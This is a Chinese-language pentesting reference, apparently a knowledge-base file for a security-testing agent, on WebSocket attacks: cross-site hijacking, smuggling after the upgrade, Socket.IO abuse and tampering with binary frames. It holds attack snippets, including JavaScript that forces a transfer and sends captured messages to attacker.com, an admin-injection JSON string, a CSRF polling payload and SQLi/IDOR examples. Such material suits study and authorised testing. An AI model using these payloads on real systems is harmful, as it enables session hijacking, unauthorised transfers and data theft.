# WebSocket 安全

> WebSocket 协议攻击面: CSWSH 跨站劫持/升级后走私/Socket.IO 特有漏洞/二进制帧操纵。
> 加载时机: 流量出现 `Upgrade: websocket` / `101 Switching Protocols`，实时通道/聊天/通知/WS API。端点来源: JS bundle、Swagger、101 响应。

## §1 基础与识别

握手: `Upgrade: websocket` + `Connection: Upgrade` + `Sec-WebSocket-Key`（base64 nonce）→ `101 Switching Protocols` + `Sec-WebSocket-Accept`（v13 标准）。

通用漏洞速查:
| 问题 | 影响 |
|---|---|
| Origin 不校验 | CSWSH |
| token 在 URL（`wss://host/ws?token=`） | 日志/代理/Referer/历史泄漏 |
| 无消息速率限制 | 爆破/DoS |
| `ws://` 非 `wss://` | 明文 MITM |
| 消息体注入 | SQLi/cmdi/存储 XSS |

推荐认证: `Sec-WebSocket-Protocol` 或首消息认证; 避免 URL token。

## §2 CSWSH（跨站 WebSocket 劫持）

条件: ①握手不校验 Origin ②受害者活动会话。攻击者页以受害者身份开**持久双向通道**（比 CSRF 强: 可读+可写）:
```javascript
const ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => ws.send(JSON.stringify({action:'transfer',to:'attacker',amount:10000})); // 写
ws.onmessage = (e) => fetch('https://attacker.com/collect',{method:'POST',body:e.data});   // 读+外带
```
**SameSite 行为**（升级请求自动带 cookie）: `None` 总发（CSWSH 可用）；`Lax`/`Strict` 不发（WS 非顶层导航）→ 阻断；legacy 无属性 cookie 老浏览器当 None。
测试: Burp 拦截升级请求改 `Origin: https://attacker.com` → 仍 101 = 无校验（再测子域变体）。

## §3 升级后走私

> h2c 走私（Upgrade 头转发问题）见 `$AGENT_DIR/knowledge-base/request-smuggling.md`；本节是 upgrade 成功后的隧道滥用。

```
1. 反代限制 /admin（403）
2. 合法 WS 升级 /ws → 代理放行（101）
3. 升级后代理停检（raw TCP passthrough）
4. 隧道内发原始 HTTP: GET /admin HTTP/1.1
5. 后端处理 → 管理内容
```
**H2-over-WS**: 隧道内发 HTTP/2 preface → 绕只检 HTTP/1.1 的 WAF。
Python: `websocket.create_connection(...)` 后 `ws.send(smuggled_bytes, opcode=0x2)`。

| 代理 | 行为 |
|---|---|
| Nginx | 101 后 raw TCP 透传——可走私 |
| HAProxy | 取决于 http-server-close vs tunnel 模式 |
| AWS ALB | 终结 WS 重组帧——难 |
| Cloudflare | 检查 WS 帧——raw HTTP 被阻 |
| Varnish | 原生不支持 WS——升级可能绕过缓存 |

**消息注入**: `ws://` 明文 + ARP 欺骗 → 双向注入帧；应用层 JSON 拼接: `msg='","admin":true,"msg":"hacked'` 进 `broadcast(\`{"user":"${u}","msg":"${msg}"}\`)`；存储广播 + 客户端 HTML 渲染 → 存储 XSS 波及全部在线用户。

## §4 Socket.IO 特有

1. **命名空间注入**: 鉴权只在默认命名空间时——`io('https://target.com/admin')` 直连特权命名空间 emit `list_users`
2. **事件名注入**: 事件名来自用户输入（`socket.on(userInput,handler)`）→ `emit('__disconnect')` 断其他客户端 / `emit('connection')` / `emit('error')`
3. **Ack 回调滥用**: `emit('get_data',{id:'admin'},cb)` 的 cb 响应可能含越权数据
4. **Polling 回退 CSRF**: WS 不可用回退 HTTP long-polling（带 cookie）→ 无 token 校验即 CSRF 面:
```
POST /socket.io/?EIO=4&transport=polling&sid=SESSION_ID
4{"type":2,"data":["transfer",{"to":"attacker","amount":1000}]}
```

## §5 二进制帧操纵

**Protobuf**: 捕帧 → `echo HEX | xxd -r -p | protoc --decode_raw`（或 protobuf-inspector）→ 改 user_id/amount/role → 重编码 `opcode=0x2` 发送。服务端不重校验字段约束即生效。
**MessagePack**:
```python
data = msgpack.unpackb(ws.recv(), raw=False)  # {'action':'get_balance','user_id':123}
data['user_id'] = 1                           # IDOR
ws.send(msgpack.packb(data), opcode=0x2)
```
**类型混淆**: user_id 整型（type 0）改字符串 `"1 OR 1=1"`（type 2）→ SQLi；`is_admin` 0x00→0x01 → 服务端信任反序列化值直接提权。

## §6 工具

| 工具 | 用途 |
|---|---|
| wsrepl | 交互测试（`-P` 插件复现 cookie/token 刷新） |
| ws-harness | WS→HTTP 桥接接 sqlmap（`-u ws:// -m message.txt` → `sqlmap -u "http://127.0.0.1:8000/?fuzz=test"`） |
| Burp + SocketSleuth | 拦截/改帧（含二进制） |
| WebSocket Turbo Intruder | 高速脚本化 fuzz |
| protobuf-inspector / msgpack-tools / wsdump / Wireshark | 二进制分析/原始帧回放/协议剖析 |

## §7 关联文件

- `$AGENT_DIR/knowledge-base/request-smuggling.md` — h2c/Upgrade 头走私（§ 互补）
- `$AGENT_DIR/knowledge-base/csrf-clickjacking.md` — CSWSH 的 CSRF 本质
